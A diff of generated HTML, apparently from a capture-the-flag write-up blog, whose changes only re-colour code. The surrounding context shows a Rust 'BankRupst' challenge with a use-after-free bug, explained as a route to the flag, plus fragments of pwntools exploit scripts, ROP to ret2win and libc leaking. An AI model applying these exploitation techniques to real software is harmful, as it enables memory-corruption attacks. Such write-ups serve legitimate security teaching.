-</span></span><span style="display:flex;"><span>            println!(<span style="color:#f1fa8c">&#34;Congrats! You are now a special member!&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#50fa7b">println!</span>(<span style="color:#f1fa8c">&#34;Congrats! You are now a special member!&#34;</span>);
 </span></span><span style="display:flex;"><span>	        <span style="color:#8be9fd;font-style:italic">let</span> flag_file <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;flag.txt&#34;</span>;
 </span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">match</span> fs::read_to_string(flag_file) {
-</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">Ok</span>(flag) <span style="color:#ff79c6">=&gt;</span> println!(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span>, flag),
-</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">Err</span>(e) <span style="color:#ff79c6">=&gt;</span> eprintln!(<span style="color:#f1fa8c">&#34;Error reading flag.txt: </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span>, e),
+</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">Ok</span>(flag) <span style="color:#ff79c6">=&gt;</span> <span style="color:#50fa7b">println!</span>(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span>, flag),
+</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">Err</span>(e) <span style="color:#ff79c6">=&gt;</span> <span style="color:#50fa7b">eprintln!</span>(<span style="color:#f1fa8c">&#34;Error reading flag.txt: </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span>, e),
 </span></span><span style="display:flex;"><span>            }
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>    } <span style="color:#ff79c6">else</span> {
-</span></span><span style="display:flex;"><span>        println!(<span style="color:#f1fa8c">&#34;Enter your BankRupst card!&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">println!</span>(<span style="color:#f1fa8c">&#34;Enter your BankRupst card!&#34;</span>);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>If our account’s balance is greater than <em>$1337</em>, the program will output the flag, so now we know our goal. We need to figure out how to achieve it.</p>
 <p>Let&rsquo;s start by taking a look at the <code>deposit</code> function.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#ff79c6">unsafe</span> <span style="color:#ff79c6">fn</span> <span style="color:#50fa7b">deposit</span>(account: <span style="color:#ff79c6">*</span><span style="color:#ff79c6">mut</span> BankAccount) {
 </span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">*</span>account).deposits <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">13</span> {
-</span></span><span style="display:flex;"><span>            println!(<span style="color:#f1fa8c">&#34;Deposit limit reached this month.&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#50fa7b">println!</span>(<span style="color:#f1fa8c">&#34;Deposit limit reached this month.&#34;</span>);
 </span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span>;
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        print!(<span style="color:#f1fa8c">&#34;How much do you want to deposit? &#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">print!</span>(<span style="color:#f1fa8c">&#34;How much do you want to deposit? &#34;</span>);
 </span></span><span style="display:flex;"><span>        io::stdout().flush().unwrap();
 </span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">let</span> <span style="color:#ff79c6">mut</span> amount_input <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">String</span>::new();
 </span></span><span style="display:flex;"><span>        io::stdin().read_line(<span style="color:#ff79c6">&amp;</span><span style="color:#ff79c6">mut</span> amount_input).unwrap();
@@ -1341,7 +1670,7 @@
 </span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> amount <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span> {
 </span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span>;
 </span></span><span style="display:flex;"><span>        } <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> amount <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">100</span> {
-</span></span><span style="display:flex;"><span>            println!(<span style="color:#f1fa8c">&#34;You cannot exceed 100 per deposit.&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#50fa7b">println!</span>(<span style="color:#f1fa8c">&#34;You cannot exceed 100 per deposit.&#34;</span>);
 </span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span>;
 </span></span><span style="display:flex;"><span>        } <span style="color:#ff79c6">else</span> {
 </span></span><span style="display:flex;"><span>            (<span style="color:#ff79c6">*</span>account).balance <span style="color:#ff79c6">+=</span> amount;
@@ -1362,9 +1691,9 @@
 </span></span><span style="display:flex;"><span>                        (<span style="color:#ff79c6">*</span>account).deposits <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
 </span></span><span style="display:flex;"><span>                        ptr::drop_in_place(account);
 </span></span><span style="display:flex;"><span>                        opened <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">false</span>;
-</span></span><span style="display:flex;"><span>                        println!(<span style="color:#f1fa8c">&#34;BankRupst card removed.&#34;</span>);
+</span></span><span style="display:flex;"><span>                        <span style="color:#50fa7b">println!</span>(<span style="color:#f1fa8c">&#34;BankRupst card removed.&#34;</span>);
 </span></span><span style="display:flex;"><span>                    } <span style="color:#ff79c6">else</span> {
-</span></span><span style="display:flex;"><span>                        println!(<span style="color:#f1fa8c">&#34;You must insert your BankRupst card!&#34;</span>);
+</span></span><span style="display:flex;"><span>                        <span style="color:#50fa7b">println!</span>(<span style="color:#f1fa8c">&#34;You must insert your BankRupst card!&#34;</span>);
 </span></span><span style="display:flex;"><span>                    }
 </span></span><span style="display:flex;"><span>                }
 </span></span><span style="display:flex;"><span>                <span style="color:#bd93f9">6</span> <span style="color:#ff79c6">=&gt;</span> {
@@ -1375,7 +1704,7 @@
 </span></span><span style="display:flex;"><span>                        dealloc(account <span style="color:#ff79c6">as</span> <span style="color:#ff79c6">*</span><span style="color:#ff79c6">mut</span> <span style="color:#8be9fd">u8</span>, layout);
 </span></span><span style="display:flex;"><span>                        account <span style="color:#ff79c6">=</span> ptr::null_mut();
 </span></span><span style="display:flex;"><span>                        opened <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">false</span>;
-</span></span><span style="display:flex;"><span>                        println!(<span style="color:#f1fa8c">&#34;Thank you for using BankRupst!&#34;</span>);
+</span></span><span style="display:flex;"><span>                        <span style="color:#50fa7b">println!</span>(<span style="color:#f1fa8c">&#34;Thank you for using BankRupst!&#34;</span>);
 </span></span></code></pre></div><p>In option 6, the memory chunk is deallocated, and the pointer is nulled.
 In option 5, this is not the case. The <code>drop_in_place</code> function only destroys the struct, but the memory chunk is not deallocated.</p>
 <p>This means that if we remove our card and insert it again, our new <code>BankAccount</code> struct will occupy the previous account&rsquo;s memory chunk.</p>
@@ -1391,7 +1720,7 @@ In option 5, this is not the case. The <code>drop_in_place</code> function only 
 </span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">let</span> ptr <span style="color:#ff79c6">=</span> alloc(layout) <span style="color:#ff79c6">as</span> <span style="color:#ff79c6">*</span><span style="color:#ff79c6">mut</span> BankAccount;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ptr.is_null() {
-</span></span><span style="display:flex;"><span>            panic!(<span style="color:#f1fa8c">&#34;Memory allocation failed!&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#50fa7b">panic!</span>(<span style="color:#f1fa8c">&#34;Memory allocation failed!&#34;</span>);
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>        (<span style="color:#ff79c6">*</span>ptr).deposits <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
@@ -2418,7 +2747,7 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">__name__</span> <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
 </span></span><span style="display:flex;"><span>    main()
 </span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
 <p>Pour un premier challenge de <em>heap</em> de ma vie, j&rsquo;ai appris énormément de choses, c&rsquo;était super intéressant !</p>
@@ -2903,7 +3232,7 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 </span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Flag:&#34;</span>, r<span style="color:#ff79c6">.</span>recvall()<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)[<span style="color:#bd93f9">6</span>]<span style="color:#ff79c6">.</span>decode(<span style="color:#f1fa8c">&#39;utf-8&#39;</span>))
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">__name__</span> <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
 </span></span><span style="display:flex;"><span>    main()
 </span></span></code></pre></div><p>Cette fois, on saute donc à la série de <code>mov</code>. Après cette dernière, puisque la comparaison est validée, les valeurs des registres <code>rbx</code>, <code>rbp</code>, <code>r12</code>, <code>r13</code>, <code>r14</code> et <code>r15</code> sont re-modifiées et on doit donc y mettre des <em>null bytes</em>.</p>
 <p>Enfin, on <code>pop rdi</code>, on y remet notre paramètre et on jump sur la fonction <code>ret2win</code>.</p>
@@ -2969,7 +3298,7 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 </span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Flag:&#34;</span>, r<span style="color:#ff79c6">.</span>recvall()<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)[<span style="color:#bd93f9">6</span>]<span style="color:#ff79c6">.</span>decode(<span style="color:#f1fa8c">&#39;utf-8&#39;</span>))
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">__name__</span> <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
 </span></span><span style="display:flex;"><span>    main()
 </span></span></code></pre></div><p>On peut vérifier qu&rsquo;il fonctionne:</p>
 <p><img src="https://user-images.githubusercontent.com/77807503/224578372-184e1e8a-1472-4ebd-91a1-48255bf7fef2.png" alt="2023-03-12-233951_1013x653_scrot"></p>
@@ -3152,7 +3481,7 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 </span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#r.interactive()</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">__name__</span> <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
 </span></span><span style="display:flex;"><span>    main()
 </span></span></code></pre></div><p>After checking that it works, we can now think about step 2: leaking <code>libc</code></p>
 <p>To do so, we can make a quick script to generate a payload that will print more addresses and check what they are with <code>pwndbg</code></p>
@@ -3324,7 +3653,7 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    r<span style="color:#ff79c6">.</span>interactive()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">__name__</span> <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
 </span></span><span style="display:flex;"><span>    main()
 </span></span></code></pre></div><p>We can make sure that it works:</p>
 <p><img src="https://user-images.githubusercontent.com/77807503/220987066-220419b3-d8c3-4fd2-97e5-745f98a78f1f.png" alt="2023-02-23-183836_1888x1030_scrot"></p>
@@ -3544,7 +3873,7 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 </span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#r.interactive()</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">__name__</span> <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
 </span></span><span style="display:flex;"><span>    main()
 </span></span></code></pre></div><p>Now, we can test it locally and remotely to check it works fine:</p>
 <p><img src="https://user-images.githubusercontent.com/77807503/220722169-62441fde-b37d-439e-bfd6-5b3d48593ab6.png" alt="2023-02-16-114129_1161x653_scrot"></p>
